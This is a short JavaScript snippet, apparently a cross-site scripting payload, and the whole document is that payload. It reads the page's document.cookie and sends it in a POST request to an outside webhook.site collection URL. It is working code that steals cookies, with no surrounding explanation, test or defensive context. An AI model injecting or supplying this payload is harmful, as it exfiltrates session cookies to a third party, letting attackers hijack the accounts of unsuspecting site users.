fetch("https://webhook.site/31af76ab-f7fb-48e1-8f59-562031cd298a", {
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({cookie: document.cookie})
});
